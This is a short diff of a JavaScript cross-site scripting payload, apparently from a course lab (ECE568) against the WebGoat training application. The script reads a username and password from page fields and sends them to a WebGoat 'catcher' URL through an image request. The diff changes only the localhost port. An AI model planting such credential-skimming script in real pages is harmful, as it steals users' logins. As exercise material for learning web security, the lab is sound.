@@ -4,7 +4,7 @@
     XssImage = new Image;
     var username = document.getElementById("ece568_2022w_user").value;
     var password = document.getElementById("ece568_2022w_pw").value;
-    var url = "http://localhost:8899/WebGoat/catcher?PROPERTY=yes&phishingUsername=" + username + "&phishingPassword=" + password;
+    var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishingUsername=" + username + "&phishingPassword=" + password;
     XssImage.src = url;
   }
 </script>
